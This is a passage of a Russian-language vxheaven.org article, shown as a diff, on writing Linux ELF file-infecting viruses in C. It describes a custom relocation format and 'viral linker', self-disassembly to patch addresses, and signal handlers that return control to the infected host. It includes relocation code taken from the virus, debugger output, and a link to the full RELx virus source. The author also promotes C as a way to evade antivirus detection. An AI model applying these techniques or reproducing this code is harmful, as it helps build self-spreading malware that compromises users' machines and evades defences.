+<tr><td>30..29</td><td>DST_FRAG</td><td>Значение указывает на (0 - код, 1 - данные, 2 - библиотечную функцию, 3 - спец. символ)</td></tr>
+<tr><td>28</td><td>SRC_TYPE</td><td>Тип адреса (0 - абсолютный, 1 - относительный)</td></tr>
+<tr><td>27-14</td><td>SRC_OFF</td><td>Смещение внутри фрагмента (в зависимости от SRC_FRAG) кода/данных, которое нужно пропатчить</td></tr>
+<tr><td>13-0</td><td>DST_OFF</td><td>Смещение внутри фрагмента (в зависимости от DST_FRAG) кода/данных, <strong>которым</strong> нужно пропатчить. Если DST_FRAG = 2, то это смещение на имя внешней функции в таблице строк, если DST_FRAG = 3, то это номер символа, определяемого компоновщиком (старая точка входа)</td></tr>
+</table>
+<p>Таким образом, значение 0xa8166c00 означает, что нужно вычислить адрес dst (фрагмент 1, т.е. начало данных вируса + 11264) и поместить его (тип 0, абсолютный адрес) по адресу src (фрагмент 1, т. е. начало данных вируса + 8281).</p>
+<p>Проще всего, объяснить на примере кода вируса, настройка на новые адреса:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> relocate<span style="color: black;">&#40;</span><span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>text<span style="color: #339933;">,</span> <span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>data<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> new_text<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> new_data<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> new_entry<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; reloc_t <span style="color: #339933;">*</span>rel<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>src<span style="color: #339933;">,</span> dst<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>rel <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>reloc_t<span style="color: #339933;">*</span><span style="color: black;">&#41;</span>data<span style="color: #339933;">;</span> <span style="color: #339933;">!</span> IS_FINI<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> rel<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* skip external symbols, they will be resolved at run-time */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>DST_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* pointer to the value that must be fixed */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; src <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>SRC_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span> <span style="color: #339933;">?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data <span style="color: #339933;">:</span> text<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> SRC_OFF<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* there is only one internal symbol (&quot;frag&quot; 3) left: __entry */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dst <span style="color: #339933;">=</span> DST_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">3</span> <span style="color: #339933;">?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new_entry <span style="color: #339933;">:</span> <span style="color: black;">&#40;</span>DST_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> new_data <span style="color: #339933;">:</span> new_text<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> DST_OFF<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* patch in absolute/relative value */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>src <span style="color: #339933;">=</span> SRC_TYPE<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dst <span style="color: #339933;">:</span> dst <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>SRC_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> new_data <span style="color: #339933;">:</span> new_text<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> SRC_OFF<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Адреса библиотечных функций:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">;</span> <span style="color: #339933;">!</span> IS_FINI<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> rel<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>DST_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> src<span style="color: #339933;">,</span> dst<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; src <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>SRC_FRAG<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> <span style="color: #339933;">&amp;</span>__data_start <span style="color: #339933;">:</span> <span style="color: #339933;">&amp;</span>__code_start<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> SRC_OFF<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dst <span style="color: #339933;">=</span> resolve<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>libc<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>__data_start <span style="color: #339933;">+</span> DST_OFF<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>src <span style="color: #339933;">=</span> SRC_TYPE<span style="color: black;">&#40;</span><span style="color: #339933;">*</span>rel<span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> dst <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span>src <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> <span style="color: #339933;">:</span> dst<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>А теперь самое интересное. Как сформировать таблицу?</p>
+<h3><a name="c31"></a>LD</h3>
+<p>Исходный код вируса компилируется gcc в объектный файл, но связывается не ld(1) из binutils, а собственным компоновщиком.</p>
+<p>Грубо говоря, что из себя представляет компоновщик? Есть несколько объектных файлов, которые содержат <em>неопределенные</em> [на стадии компиляции] (<em>undefined</em>) символы (то что в программе объявлено, как <code>extern</code>), и <em>глобальные</em> (<em>global</em>) символы всё, что не <code>static</code>). Символом может быть, как функция, так и переменная. Задача компоновщика - <em>связать</em> (<em>link</em>) их между собой, то есть подставить адреса глобальных символов, определенных в одном из файлов, в тот файл, в котором этот символ не определен. Более сложные ситуации, такие как weak symbols, symbol versioning, и прочие неудобоваримые подробности опустим за ненадобностью. Переписывать заново <code>ld(1)</code> совсем не нужно. Что делает "вирусный ld":</p>
+<ul>
+<li>Считывает в память все объектные файлы указанные в командной строке</li>
+<li>Копирует все секции с флагом SHF_ALLOC, либо во фрагмент кода (секции SHF_EXECINSTR), либо во фрагмент данных. Если секция имеет тип SHT_NOBITS (.bss), то её содержимое не копируется, а заполняется нулями. Запоминается смещение внутри фрагмента, по которому находится содержимое скопированной секции.</li>
+<li>Просматривает все таблицы релоков (секции с типом SHT_REL), обрабатываются только записи с типами R_386_32 и R_386_PC32</li>
+<li>Для каждой записи о релоке
+<ul>
+<li>Определяется фрагмент, в котором расположен релок и смещение</li>
+<li>Ищется символ, на который ссылается релок. Возможны варианты:
+<ul>
+<li>Символ определён в одном из объектных файлов. Определяем фрагмент/смещение.</li>
+<li>Имя символа начинается с __ - это специальные символы: начало/конец кода/данных, старая точка входа. dst_frag = 3.</li>
+<li>Символ не найден. Будем считать, что он внешний. Скопируем имя в таблицу строк, запомним смещение в таблице строк. dst_frag = 2.</li>
+</ul></li>
+<li>Релок в собственном формате добавляется в таблицу</li>
+</ul></li>
+<li>Таблица релоков и строк копируются во фрагмент данных, производятся необходимые корректировки.</li>
+<li>Формируется и записывается исполняемый файл. При этом используется та же функция (relocate()), что и в коде вируса. Поля разнообразных структур заполняются по минимуму, лишь бы работало. ;-)</li>
+</ul>
+<p>...и работает. :-)</p>
+<h2><a name="c4"></a>Перемещаемый код без релоков</h2>
+<p>Есть ещё один интересный (теперь уже риторический) вопрос - а нельзя ли сделать то же самое (пожертвовав некоторой функциональностью), но без таблиц и без собственных линкеров? Попроще как-нибудь... Да, можно! Возьмём любую программу, хотя бы и такую:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> a <span style="color: #339933;">=</span> <span style="color: #0000dd;">10</span><span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Hello %d %d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> a <span style="color: #339933;">+</span> <span style="color: #0000dd;">256</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">11</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<pre class="source">
+ 8048395:       6a 0b                   push   $0xb		; 11
+ 8048397:       a1 a0 95 04 08          mov    0x80495a0,%eax	; a
+ 804839c:       05 00 01 00 00          add    $0x100,%eax	; 256
+ 80483a1:       50                      push   %eax		; a + 256
+ 80483a2:       68 90 84 04 08          push   $0x8048490	; "Hello %d %d\n"
+ 80483a7:       e8 ec fe ff ff          call   8048298 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="38484a51564c5e7848544c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>      
+</pre>
+<p>Даже ослу понятно, что 80495a0, 8048490 и 8048298 - это <em>адреса</em>, а 11 и 256 - это <em>константы</em>, при этом 80495a0 и 8048490 - это <em>данные</em> (указывают на секции .data и .rodata), а 8048298 - это <em>код</em>, и мало того, что код, вызов внешней функции (секция .plt). Если это понятно ослу, то попробуем обучить этому нехитрому умению вирус.</p>
+<p>Чтобы упростить код, как и впредыдущем случае склеим секции .data и .rodata, но в этот раз при помощи скрипта компоновщика (info ld). Получим стандартный скрипт компоновки (<tt>ld --verbose</tt>) и немного его поправим, заменим:</p>
+<pre>
+  .text           :
+  {
+    *(.text .stub .text.* .gnu.linkonce.t.*)
+    KEEP (*(.text.*personality*))
+    ...
+  .data           :
+  {
+    *(.data .data.* .gnu.linkonce.d.*)
+    ...
+</pre>
+<p>на</p>
+<pre>
+	__text_start =.;
+	_text : {
+		stub.o(.text)
+		virus.o(.text)
+	} =0x90909090
+	__text_end =.;
+	...
+</pre>
+<p>Нам нужны символы, указывающие на начало/конец кода/данных (text/data start/end) <em>и</em> нам нужно, чтобы в коде вируса отсутствовали функции, определённые в crt*.o (все эти __do_global_dtors_aux, frame_dummy и прочий мусор). Поэтому вместо *(.text), я пишу virus.o(.text), то есть взять секцию .text не из всех файлов, а только из virus.o. .bss можно приклеить к .data, а можно задавить аттрибутом ((section (".data"))).</p>
+<p>Для того, чтобы исправить адреса в коде вируса, я взял дизассемблер (<cite>YAD, EOF#2</cite>). Вирус дизассемблирует собственный код и проверяет все константы, которые являются частью инструкции. Если константа попадает в диапазон [__text_start ... __text_end], то вирус считает её адресом, указывающим на код, если [__data_start ... __data_end] - то на данные. Исправить адрес просто: нужно вычесть старый адрес кода/данных (__text_start/data_start) и добавить новый (new_text / new_data, которые вычисляются в функции заражения):</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span>p <span style="color: #339933;">-</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #208080;">0x61</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: #339933;">*</span>p <span style="color: #339933;">==</span> <span style="color: #208080;">0xe9</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">3</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">30</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span> <span style="color: black;">&#40;</span>offset <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+<span style="color: #339933;">#define CHECK_FOR_REL(a,b,c, d) \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (y.a &gt;= (uint32_t)&amp;__ ## b ## _start &amp;&amp; y.a &lt;= (uint32_t)&amp;__ ## b ## _end) &nbsp; \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r = (offset + y.len - 4 + c) | (d &lt;&lt; 30); &nbsp; &nbsp; &nbsp; \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CHECK_FOR_REL<span style="color: black;">&#40;</span>data4<span style="color: #339933;">,</span> text<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CHECK_FOR_REL<span style="color: black;">&#40;</span>data4<span style="color: #339933;">,</span> data<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CHECK_FOR_REL<span style="color: black;">&#40;</span>addr4<span style="color: #339933;">,</span> text<span style="color: #339933;">,</span> <span style="color: #339933;">-</span>y.<span style="color: #202020;">datasize</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CHECK_FOR_REL<span style="color: black;">&#40;</span>addr4<span style="color: #339933;">,</span> data<span style="color: #339933;">,</span> <span style="color: #339933;">-</span>y.<span style="color: #202020;">datasize</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>Результат складывается в таблицу для последующего использования.</p>
+<p>Если в коде вируса попадётся <em>константа</em>, попадающая в соответсвующий диапазон, то всё пропало. :-) Вероятность этого не велика, кроме того подобный глюк будет выявлен и исправлен на этапе отладки. Код можно улучшить при помощи нескольких простых правил:</p>
+<ul>
+<li>Константа не является адресом кода, если указывает в середину инструкции</li>
+<li>Константа не является адресом данных, если не выравнена на границу слова</li>
+</ul>
+<p>Возникает соблазн использовать этот же алгоритм для перемещения кода жертвы, но такой фокус для некоторых файлов закончится весьма плачевно.</p>
+<p><strong>NB!</strong> ... но в результате более детального анализа, мне кажется, всё-таки возможно отличить адреса от констант, по крайней мере в файлах скопилированных определённым компилятором. В конце концов, можно и прототипы функций из /usr/include вытащить (<tt>grep -r '^[^#].* [\*]*ftw[ ]*(' /usr/include|sed 's/[^(,\*)]//g'</tt>). Шутки - шутками, а подумать есть над чем.</p>
+<p>Однако, я точно знаю, как устроен код моего вируса, поэтому для кода вируса алгоритм будет работать надёжно даже без проверок.</p>
+<p>...и работает. :-)</p>
+<h2><a name="c5"></a>Обработка ошибок</h2>
+<p>Обсуждая со знакомым, некоторые аспекты заражения файлов, я получил хороший совет: <em>Будет проще [установить обработчик исключений], и именно так работает большинство вирусов под Windows. Слишком много чего может пойти не так при разборе заголовков, не стоит проверять все возможные варианты (или даже знать о них).</em> Этот совет относится не только к заголовкам. Поэтому оба вируса перехватывают сигналы SIGSEGV и SIGBUS. Если обработчик получит управление, то он востановит стек (переменная orig_esp), и вернет управление программе-носителю.</p>
+<h2><a name="c6"></a>Заключение</h2>
+<p>Предложенный метод позволяет:</p>
+<ul>
+<li><em>Существенно ускорить и упростить разработку.</em> Раньше я <del>пользовалась обычным порошком</del> писал прототипы на Си, потом долго и нудно кодил их асмом, теперь я просто за день-два пишу и отлаживаю вирус. Хотя муторный кодинг помог мне выучить асм, который необходимо знать, но совсем необязательно им пользоваться.</li>
+<li><em>Повысить читабельность исходных текстов</em> (тебе интересно, как выглядит на ассемблере выражение <tt>p->shdr[p->symtab[k].st_shndx].sh_flags &amp; SHF_EXECINSTR ? 0 : 1</tt>?<sup><a href="#f1" name="b1">[1]</a></sup> Мне нет.)</li>
+<li><em>Затрудняет детектирование</em>, у антивирусов с HLL всегда были проблемы (<em>см. <del>рис. 1</del></em> <tt>`cc1 --help`</tt>, любой полиморфный движок обзавидуется)</li>
+</ul>
+<p>Писать на HLL можно было и без этого, но приходилось либо запихивать необходимый функционал в библиотеку (как предложил в своё время <cite>Whale "<a href="/lib/vwa00.html">Позиционно-независимый код на HLL. Загрузка DLL из памяти.</a>"</cite>) либо, буквально упрашивать компилятор сгенерировать "правильный" код в "правильном" порядке, после чего компилятор обновлялся и приходилось начинать всё по новой. Одна только диверсия с <tt>-funit-at-a-time</tt> чего стоит!</p>
+<p>Вопреки распространенному мнению, вирусы на Си получаются вполне компактные (2-3 килобайта кода), можно было бы переписать их на ассемблере и сэкономить пару сотен байт, но <del>всем похуй</del> кому это нужно?</p>
+<h2><a name="c7"></a>Примеры</h2>
+<p>Полный код вирусов RELx.A/G2 и примеров можно скачать <a href="/src.php?info=relx.zip">здесь</a>.</p>
+<dl>
+<dt>1.asm</dt><dd>Дельта-смещение. Классика.</dd>
+<dt>2.asm</dt><dd>Адрес вируса в памяти.</dd>
+<dt>3.asm</dt><dd>Адрес данных вируса в памяти.</dd>
+<dt>4.asm</dt><dd>То же, но без CALL</dd>
+<dt>5.asm</dt><dd>Исправление адреса переменной</dd>
+</dl>
+<h3><a name="c71"></a>Как работать с примерами?</h3>
+<pre>
+$ make
+...
+$ gdb ./4
+...
+(gdb) r
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x080493e2 in ?? ()
+<em>можно убедиться, что адрес переменной верен</em>
+(gdb) info reg
+eax            0x55aa55aa       1437226410
+...
+<em>это исправленный код (в памяти)</em>
+(gdb) disas 0x080493d8 0x080493e2
+Dump of assembler code from 0x80493d8 to 0x80493e2:
+0x080493d8:     mov    $0x80493e2,%ebp
+0x080493dd:     mov    0x0(%ebp),%eax
+0x080493e0:     int    $0x3
+(gdb) q
+<em>исходный код (в файле)</em>
+$ objdump -d 4|tail
+ 804888e:       bd 00 00 00 00          mov    $0x0,%ebp
+ 8048893:       8b 45 00                mov    0x0(%ebp),%eax
+ 8048896:       cd 03                   int    $0x3
+</pre>
+<hr size="1"/>
+<p><a name="f1" href="#b1">1</a> Вот так (-ggdb -Wa,-ahl). Оно тебе надо?</p>
+<pre style="font-size: 8pt;">
+ 1270 0b18 8B459C               movl    -100(%ebp), %eax
+ 1271 0b1b 8B4814               movl    20(%eax), %ecx
+ 1272 0b1e 8B459C               movl    -100(%ebp), %eax
+ 1273 0b21 8B501C               movl    28(%eax), %edx
+ 1274 0b24 8B45A8               movl    -88(%ebp), %eax
+ 1275 0b27 C1E004               sall    $4, %eax
+ 1276 0b2a 8D0402               leal    (%edx,%eax), %eax
+ 1277 0b2d 0FB7400E             movzwl  14(%eax), %eax
+ 1278 0b31 0FB7D0               movzwl  %ax, %edx
+ 1279 0b34 89D0                 movl    %edx, %eax
+ 1280 0b36 C1E002               sall    $2, %eax
+ 1281 0b39 01D0                 addl    %edx, %eax
+ 1282 0b3b C1E003               sall    $3, %eax
+ 1283 0b3e 8D0401               leal    (%ecx,%eax), %eax
+ 1284 0b41 8B4008               movl    8(%eax), %eax
+ 1285 0b44 83E004               andl    $4, %eax
+ 1286 0b47 85C0                 testl   %eax, %eax
+ 1287 0b49 0F94C0               sete    %al
+ 1288 0b4c 0FB6C0               movzbl  %al, %eax
+ 1289 0b4f 8945DC               movl    %eax, -36(%ebp)
+</pre>
+[<a style="" href="/lib/?lang=RU&amp;index=UN#vhe07">Вернуться к списку</a>] [<a href="/lib/vhe07.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhe07">de</a><a href="/lib/index.php?lang=en&amp;id=vhe07">en</a><a href="/lib/index.php?lang=es&amp;id=vhe07">es</a><a href="/lib/index.php?lang=it&amp;id=vhe07">it</a><a href="/lib/index.php?lang=fr&amp;id=vhe07">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhe07">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhe07">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhe07">ua</a></div>
+<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
+</html>
